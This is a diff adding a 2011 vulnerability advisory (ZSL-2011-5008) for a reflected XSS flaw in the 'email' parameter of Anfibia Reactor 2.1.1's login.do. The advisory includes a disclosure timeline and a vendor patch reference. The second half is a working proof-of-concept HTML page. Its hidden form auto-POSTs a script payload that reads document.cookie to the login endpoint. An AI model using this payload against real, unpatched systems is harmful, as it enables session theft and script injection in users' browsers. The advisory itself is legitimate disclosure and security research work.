@@ -1,0 +1,65 @@
+<!--
+
+
+Anfibia Reactor 2.1.1 (login.do) Remote XSS POST Injection Vulnerability
+
+
+Vendor: Anfibia Software
+Product web page: http://www.anfibia-soft.com
+Affected version: 2.1.1.12
+
+Summary: Fast web-based server monitoring. Keep an eye on servers,
+connections, databases, cpu, hard drives and more!
+
+Desc: The Anfibia Reactor JS service suffers from a XSS vulnerability
+when parsing user input to the 'email' parameter via POST method in
+'reactor/login.do' script at the manager login interface. Attackers
+can exploit this weakness to execute arbitrary HTML and script code
+in a user's browser session.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+
+[14.03.2011] Vulnerability discovered.
+[16.03.2011] Contact with the vendor.
+[16.03.2011] Vendor replies asking more details.
+[16.03.2011] Sent vulnerability details to vendor.
+[16.03.2011] Vendor confirms XSS issue.
+[06.04.2011] Vendor releases version 3 to address this issue.
+[06.04.2011] Coordinated public advisory released.
+
+
+Advisory ID: ZSL-2011-5008
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5008.php
+
+Vendor Advisory: http://www.anfibia-soft.com/products/reactor/whatsnew.htm
+                 http://www.anfibia-soft.com/products/reactor/help/Introduction/The%20New%20Anfibia%20reactor.htm
+Vendor Patch: http://www.anfibia-soft.com/download/anfibiareactorsetup.exe
+
+
+14.03.2011
+
+
+-->
+
+
+
+<html>
+<title>Anfibia Reactor 2.1.1 Remote XSS POST Injection Vulnerability</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">function xss1(){document.forms["xss"].submit();}</script>
+<form action="http://10.0.0.17:2188/reactor/login.do" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="token" id="token" value="" />
+<input type="hidden" name="passwdhash" id="passwdhash" />
+<input type="hidden" name="email" id="email" value='"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="password" id="password" />
+</form>
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><center><h3><br /><br />Exploit!<h3></center></font></b></a>
+</body>
+</html>
